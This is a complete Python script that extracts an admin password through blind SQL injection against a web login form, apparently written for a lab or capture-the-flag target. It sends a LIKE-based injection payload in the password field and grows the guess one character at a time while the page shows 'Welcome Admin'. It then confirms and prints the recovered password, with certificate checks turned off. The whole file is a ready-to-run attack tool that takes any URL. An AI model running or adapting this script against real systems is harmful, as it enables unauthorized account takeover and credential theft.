import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

load_bar = ['-','\\', '|', '/']
def password_decrypt(url):
    upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    lower = 'abcdefghijklmnopqrstuvwxyz'
    num = '1234567890'
    chars = lower + num + upper
    
    global password
    append_char = ""
    condition = True
    while condition:
        for char in chars:
            password = append_char+char
            sqli = "' or password like '"+password+"%' --  "
            payload = {
                'username': 'admin',
                'password': sqli,
                'submit': 'Connect'
            }
            r = requests.post(url, data=payload, verify=False)
            if str(char) == chars[-1]:
                condition=False
                password = password[:-1]
                return password

            elif "Welcome Admin" in r.text:
                append_char += char
                frame = len(password) % len(load_bar)
                print(f'\rCracking the password [{load_bar[frame]*len(password):=<{len(password)}}]', end='')
                break

def check_password(url, password):
    payload = {
        'username': 'admin',
        'password': password,
        'submit': 'Connect'
    }
    r = requests.post(url, data=payload, verify=False)
    
    if "Welcome Admin" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print("\n[-] Usage: %s <url>\n" % sys.argv[0])
        sys.exit(-1)

    if password_decrypt(url):
        if check_password(url, password):
            print("\n[+] Successful! The password is: "+ str(password))
        else:
            print("\n[-] The password you have obtained is '"+ str(password)+"' but it is not the access password, you should add more characters to your dictionary.")
    else:
        print("\n[-] Unsuccessful!")
